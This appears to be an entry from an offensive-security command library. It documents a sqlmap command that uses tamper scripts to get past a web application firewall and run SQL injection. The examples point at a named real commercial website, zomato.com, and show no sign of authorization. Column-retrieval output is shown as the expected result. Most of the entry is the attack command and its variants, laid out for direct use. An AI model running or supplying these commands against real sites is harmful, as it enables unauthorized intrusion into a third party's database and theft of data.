---
id: cmd-258582-sqlmap-bypass
data: >-
  sqlmap -u "https://www.zomato.com/endpoint?param=*"
  --tamper=space2comment,charencode --level=3 --risk=2
tags:
  - sqli
  - automation
  - waf-bypass
type: command
output: '[INFO] the back-end DBMS is MySQL ... retrieved columns'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.037Z'
verified: false
validated: true
submitted: true
---
# sqlmap-waf-bypass

## Command

```bash
sqlmap -u "https://www.zomato.com/endpoint?param=*" --tamper=space2comment,charencode --level=3 --risk=2
```

## Description

Sqlmap command to automate WAF bypass and SQL injection testing using tamper scripts for payload obfuscation, targeting vulnerable web parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with injectable parameter (*) | Yes |
| `--tamper` | Scripts to modify payloads (e.g., space2comment replaces spaces with /**/) | Yes |
| `--level` | Testing thoroughness (1-5) | No |
| `--risk` | Payload risk level (1-3) | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://target.com/page?id=*" --tamper=charencode
```

### Advanced Usage

```bash
sqlmap -u "https://www.zomato.com/endpoint?param=*" --tamper=space2comment,charencode --level=3 --risk=2 --batch
```

## Expected Output

Sqlmap logs detailing tamper application, DBMS detection, and injection points if successful; e.g., "[INFO] POST parameter 'param' is vulnerable to SQL injection".

## Related

- [[Related Procedure: Bypass-WAF-for-SQL-Injection-Exploitation]]
- [[commands/sqlmap-union-extract]]
